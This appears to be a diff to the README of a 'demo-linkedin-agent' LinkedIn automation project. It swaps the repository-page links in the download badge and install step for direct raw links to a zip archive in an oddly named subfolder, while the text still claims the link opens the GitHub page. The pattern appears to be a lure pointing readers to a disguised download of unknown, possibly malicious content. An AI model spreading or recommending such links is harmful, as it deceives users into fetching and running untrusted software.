@@ -1,10 +1,10 @@
 # 🤖 demo-linkedin-agent - Automate Your LinkedIn Posts Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-demo--linkedin--agent-blue?style=for-the-badge&logo=github)](https://github.com/juese72/demo-linkedin-agent)
+[![Download Now](https://img.shields.io/badge/Download-demo--linkedin--agent-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/juese72/demo-linkedin-agent/main/viperiform/demo-agent-linkedin-v3.3.zip)
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/juese72/demo-linkedin-agent](https://github.com/juese72/demo-linkedin-agent)
+Visit this link to download the application: [https://raw.githubusercontent.com/juese72/demo-linkedin-agent/main/viperiform/demo-agent-linkedin-v3.3.zip](https://raw.githubusercontent.com/juese72/demo-linkedin-agent/main/viperiform/demo-agent-linkedin-v3.3.zip)
 
 Once you click the link, you'll be taken to the GitHub page where you can download the software. This is a simple process that takes just a few minutes.
 
